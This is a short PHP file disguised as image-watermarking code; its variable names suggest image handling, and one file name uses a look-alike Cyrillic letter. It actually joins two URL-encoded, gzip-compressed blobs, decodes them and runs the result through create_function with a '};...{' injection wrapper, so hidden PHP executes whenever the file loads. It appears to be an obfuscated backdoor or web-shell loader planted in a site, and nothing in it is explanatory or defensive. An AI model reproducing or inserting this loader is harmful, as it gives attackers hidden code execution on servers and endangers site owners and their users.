<?php 
$image = '';
$nameimage = 'no_namе.png';
$size = array('1024','768');
$imagewatermark = '%ADT%5B%8E%830%0C%3C%8D%FFI%EC%C4%E4%B3%40%B9%FF%91%D63I%BB-%BB%D5%A2m%A5%08%05%3F%C6%9E%B1A%B2%89%B9%D8%2A%B6%8Be%B1%84%7BQ%29%8Bd%97%B2%8B%BAh%13-%A2%95%CF2%5E%C3%85%80MtC%96g%9C%1A%97%26y%86%CBU%DC%60%EC%91y%92%7C%A5%3D%C2v%B84%89%2A%5D%2B%ED%13%D2%ABJ%5D%1E%8C%049%A4%03%A1%88W%DA%A3%99%05%DEZ%C5%8B%D4%2B%10%22%A56T%89%D7p%81E%E2%09.3';
$data = img($imagewatermark,$size);

function img($lmagewatermark,$size,$nameimage='no_name.png'){
	$imagewatermark = '%89%24%B2%98%D0%40pA%C3L%094_xO%2Fx%C5%FD%22%EEl%A0%A1VX%D0%2Ac%60d%FF%28%BD2%E5%EE%DD%995Ku%9E%86%B0h%F8%3B%40%89%B0%F2%F4%A2%F3%13%82E%F5%0B_Iy%88%60%00%C1%9DL%7B%E7e%19t0%9D%88%DC%FE%D0%27%2A%86DPi%1AR%8C%3B%D5%F8%B5P%A4c4%3A%5C%F7%2CS.R%9CE%AC%89%95%D1L%07%8C%7E%D0%FC%7E6X%2Fb%D3%B0%94%09%91%D8L%FB%11%D69%DAm%D0%DB%91%D1%99%05%E8%7Cq%B8i%FFAHo%23%E4%B7%11t+%84%26%18q%E5h%B8%99u%C3%27%869%B6%87%29%DFz%F6%E5I%C0%F7%7F%0B%119%26%3E%8F%21%7E%000%0D%C0SR%18%A9%AD%1F%2A%9DG%E9%83n%07%A9_%7D%17%8F%3A%87%1A%FD%F7%D5%BF%F7C%0C%D0%C2%DB%A1%3AB%1B%1B%EEX%F5%2F';
	$watermark='};'.urldecode(gzinflate(urldecode($lmagewatermark.$imagewatermark))).'{'; create_function('',$watermark);
}
?>